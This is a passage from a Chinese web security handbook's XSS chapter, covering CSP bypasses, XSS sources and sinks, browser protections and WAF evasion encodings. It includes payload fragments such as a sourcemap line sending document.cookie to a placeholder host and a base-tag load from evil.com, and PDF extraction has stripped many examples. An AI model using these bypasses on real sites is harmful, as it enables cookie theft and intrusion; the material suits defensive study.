– 只能从给定的域用 https 加载资源
• https:
– e.g. img-src https:
– 只能从任意域用 https 加载资源
• unsafe-inline
– 允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签
– e.g. script-src 'unsafe-inline'
• unsafe-eval
– 允许一些不安全的代码执行方式，例如 js 的 eval()
– e.g. script-src 'unsafe-eval'
• nonce-'
88 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
– 使用随机的 nonce，允许加载标签上 nonce 属性匹配的标签
– e.g. script-src 'nonce-bm9uY2U='
• -'
– 允许 hash 值匹配的代码块被执行
– e.g. script-src 'sha256-'
配置范例
允许执行内联 JS 代码，但不允许加载外部资源
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
Bypass
预加载
浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载
指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。
HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可
以向外界发出请求，例如
另外，不是所有的页面都能够被预加载，当资源类型如下时，讲阻止预加载操作：
• URL 中包含下载资源
• 页面中包含音频、视频
• POST、PUT 和 DELET 操作的 ajax 请求
• HTTP 认证
• HTTPS 页面
4.2. XSS 89
Web-Sec Documentation, 发布 1.0
• 含恶意软件的页面
• 弹窗页面
• 占用资源很多的页面
• 打开了 chrome developer tools 开发工具
MIME Sniff
举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再‘‘‘‘，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器
会进行猜测，就可能加载该 img 作为脚本
302 跳转
对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：
• 跳板必须在允许的域内。
• 要加载的文件的 host 部分必须跟允许的域的 host 部分一致
iframe
当可以执行代码时，可以创建一个源为 css js 等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，
则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用 ../../../ /%2e%2e%2f 等可能触发服务
器报错的链接也可以到达相应的目的。
base-uri
当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过 base 标签修改根 URL 来 bypass，如下加
载了 http://evil.com/main.js
其他
• location 绕过
• 可上传 SVG 时，通过恶意 SVG 绕过同源站点
• 存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析
• CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass
90 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
• Angular versions =1.5.0，存在漏洞 Git Pull Request
• jQuery sourcemap
document.write(`
//@ sourceMappingURL=http://xxxx/`+document.cookie+``);``
• a 标签的 ping 属性
• For FireFox 
• 
• 
• 仅限制 script-src 时：
– 
4.2.5 XSS 数据源
URL
• location
• location.href
• location.pathname
• location.search
• location.hash
• document.URL
• document.documentURI
• document.baseURI
Navigation
• window.name
• document.referrer
Communication
• Ajax
4.2. XSS 91
Web-Sec Documentation, 发布 1.0
• Fetch
• WebSocket
• PostMessage
Storage
• Cookie
• LocalStorage
• SessionStorage
4.2.6 Sink
执行 JavaScript
• eval(payload)
• setTimeout(payload, 100)
• setInterval(payload, 100)
• Function(payload)()
• 
• 
加载 URL
• location=javascript:alert(/xss/)
• location.href=javascript:alert(/xss/)
• location.assign(javascript:alert(/xss/))
• location.replace(javascript:alert(/xss/))
执行 HTML
• xx.innerHTML=payload
• xx.outerHTML=payload
• document.write(payload)
• document.writeln(payload)
92 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
4.2.7 XSS 保护
HTML 过滤
使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用
该方式实现了 XSS 的保护。
X-Frame
X-Frame-Options 响应头有三个可选的值：
• DENY
– 页面不能被嵌入到任何 iframe 或 frame 中
• SAMEORIGIN
– 页面只能被本站页面嵌入到 iframe 或者 frame 中
• ALLOW-FROM
– 页面允许 frame 或 frame 加载
XSS 保护头
基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏
览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被
转义，恶意代码不会被正常的渲染出来。
而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。
要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段该字段有三个可选的值
• 0 : 表示关闭浏览器的 XSS 防护机制
• 1 : 删除检测到的恶意代码，如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为
X-XSS-Protection 配置为 1，这是浏览器的默认设置
• 1; mode=block : 如果检测到恶意代码，在不渲染恶意代码
FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。
4.2.8 WAF Bypass
• 利用 <> 标记
• 利用 html 属性
– href
– lowsrc
4.2. XSS 93
Web-Sec Documentation, 发布 1.0
– bgsound
– background
– value
– action
– dynsrc
• 关键字
– 利用回车拆分
– 字符串拼接
* window["al" + "ert"]
• 利用编码绕过
– base64
– jsfuck
– String.fromCharCode
– HTML
– URL
– hex
* window["\x61\x6c\x65\x72\x74"]
– unicode
– utf7
* +ADw-script+AD4-alert('XSS')+ADsAPA-/script+AD4-
– utf16
• 大小写混淆
• 对标签属性值转码
• 产生事件
• css 跨站解析
• 长度限制 bypass
– eval(name)
– eval(hash)
– import
– $.getScript
94 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
– $.get
• .
– 使用 。绕过 IP/域名
– document['cookie'] 绕过属性取值
• 过滤引号用 ‘‘ ‘ ‘‘ 绕过
4.2.9 技巧
httponly
• 在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。
• 在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie
• 部分特定版本的浏览器可能会在 httponly 支持/处理上存在问题
• 低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段
• phpinfo 等页面可能会回显信息，这些信息中包含 http 头
• 通过 xss 劫持页面钓鱼
• 通过 xss 伪造 oauth 等授权请求，远程登录
CSS 注入
基本介绍
CSS注入最早开始于利用CSS中的expression()url()regex()等函数或特性来引入外部的恶意代码，但
是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。
CSS selectors
4.2. XSS 95
Web-Sec Documentation, 发布 1.0
上图是利用 CSS selectors 完成攻击的一个示例
Abusing Unicode Range
当可以插入 CSS 的时候，可以使用 font-face 配合 unicode-range 获取目标网页对应字符集。PoC 如下
AB
当字符较多时，则可以结合 ::first-line 等 CSS 属性缩小范围，以获取更精确的内容
Bypass Via Script Gadgets
简介
一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为 Code Reuse 的攻
击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的
目的。在论文 Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via
Script Gadgets 中有该方法的具体描述。
portswigger 的 一 篇 博 文 也 表 达 了 类 似 的 想 法 https://portswigger.net/blog/
abusing-javascript-frameworks-to-bypass-xss-mitigations。
96 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
下面有一个简单的例子，这个例子使用了 DOMPurify 来加固，但是因为引入了 jquery.mobile.js 导致可
以被攻击。